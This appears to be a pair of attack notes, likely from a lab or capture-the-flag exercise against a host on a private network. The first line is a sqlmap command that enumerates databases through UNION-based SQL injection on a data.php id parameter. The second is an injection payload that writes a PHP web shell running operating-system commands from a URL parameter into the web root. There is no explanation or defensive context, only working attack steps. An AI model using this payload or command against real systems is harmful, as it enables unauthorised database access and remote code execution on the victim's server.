sqlmap -u "http://192.168.16.1:1337/data.php?id=2" --technique=U --dbs

' UNION ALL SELECT NULL, NULL, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/a.php' -- -